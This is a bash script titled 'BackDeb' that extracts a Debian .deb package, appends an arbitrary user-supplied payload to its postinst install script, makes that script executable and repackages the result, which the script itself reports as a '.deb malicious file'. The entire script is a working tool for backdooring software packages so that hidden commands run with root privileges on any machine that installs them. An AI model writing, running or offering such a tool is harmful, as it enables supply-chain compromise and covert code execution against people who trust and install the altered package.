#!/bin/bash

filename="$1"
payload="$2"
filename="${filename%%.*}"


function banner () {
	ban="

  ____             _    ____       _     
 | __ )  __ _  ___| | _|  _ \  ___| |__  
 |  _ \ / _\` |/ __| |/ / | | |/ _ \ '_ \ 
 | |_) | (_| | (__|   <| |_| |  __/ |_) |
 |____/ \__,_|\___|_|\_\____/ \___|_.__/ 
                                                     
	"
	echo -e "$ban"
}
function usage () {
	echo "[+] Usage: ./backdeb.sh file.deb \"payload\""
}

function verifyParameters () {
	if [ -z "$2" ]; then
		usage
		exit
	fi
	if [[ $1 != *.deb ]]; then
		usage
		echo "[+] must specify a .deb file"
		exit
	fi
	if [ -z "$(which dpkg-deb)" ]; then
		usage
		echo "[+] you need dpkg-deb"
		exit
	fi

}

function extractDeb () {
	echo "[+] Extracting .deb package"
	dpkg-deb -R $1 $filename
}

function createBackdoor () {
	echo "[+] Backdooring postinst file"
	if [ -z "$(ls $filename/DEBIAN/postinst 2>/dev/null)" ]; then
		echo "#!/bin/bash" > $filename/DEBIAN/postinst
		echo "$payload" >> $filename/DEBIAN/postinst
	else
		echo "$payload" >> $filename/DEBIAN/postinst
	fi
	echo "[+] Giving postinst permissions"
	chmod +x $filename/DEBIAN/postinst
}
function createPackage () {
	echo "[+] Creating .deb backdoored package"
	dpkg-deb --build $filename 1>/dev/null
}

function cleanFiles () {
	echo "[+] Cleaning temp files"
	rm -rf $filename
}

banner
verifyParameters "$1" "$2"
extractDeb $1 $filename
createBackdoor $filename $2 $payload
createPackage $filename
cleanFiles $filename
echo "[+] Created .deb malicious file in $(pwd)/$filename.deb"
